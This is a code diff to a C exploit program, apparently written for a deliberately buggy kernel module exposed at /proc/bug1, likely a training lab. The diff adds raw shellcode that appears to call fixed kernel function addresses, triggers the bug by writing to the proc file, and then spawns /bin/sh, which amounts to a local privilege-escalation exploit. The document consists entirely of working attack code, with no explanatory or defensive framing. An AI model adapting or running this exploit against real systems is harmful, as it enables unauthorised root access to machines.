@@ -4,8 +4,16 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <stdlib.h>
 
+#undef BEEFPAYLOAD
+
+#ifdef BEEFPAYLOAD
 char payload[] = "\xe9\xea\xbe\xad\x0b";
+#else
+// use makepayload.sh
+char payload[] = "\x48\x31\xc0\x4c\x89\x14\x25\x70\x8b\x09\xb0\x41\xff\xd2\x4c\x89\x14\x25\x00\x88\x09\xb0\x41\xff\xd2\xc3";
+#endif
 
 int main()
 {
@@ -18,4 +26,8 @@ int main()
 
 	int fd = open("/proc/bug1", O_WRONLY);
 	write(fd, "foo", 3);
+
+#ifndef BEEFPAYLOAD
+	system("/bin/sh");
+#endif
 }
